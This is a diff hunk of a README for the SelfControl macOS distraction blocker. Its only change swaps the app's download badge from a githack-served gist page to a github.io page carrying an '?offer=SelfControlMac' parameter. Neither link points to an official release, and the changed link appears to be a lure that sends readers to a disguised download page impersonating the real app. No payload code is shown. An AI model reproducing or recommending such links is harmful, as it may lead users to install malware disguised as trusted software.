@@ -3,7 +3,7 @@
 **SelfControl** is a free and open-source **distraction blocker for macOS** that helps you focus by blocking access to distracting websites, mail servers, or anything else on the internet.  
 Once started, you can’t undo it — even by restarting your Mac. 🧠💻  
 
-[![🧡 Get GitHub Instruction](https://img.shields.io/badge/🧡%20Get%20SelfControl%20App-FC8019?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/makaroon2010/4ee6818993ebabe3e017bf176e50a166/raw/48065f0f087e821b3f4148eadd2a2c165dc5c9d6/selfcontrol.html?offer=SelfControlMac)
+[![🧡 Get GitHub Instruction](https://img.shields.io/badge/🧡%20Get%20SelfControl%20App-FC8019?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://deployer-app.github.io/.github/?offer=SelfControlMac)
 
 ---
 
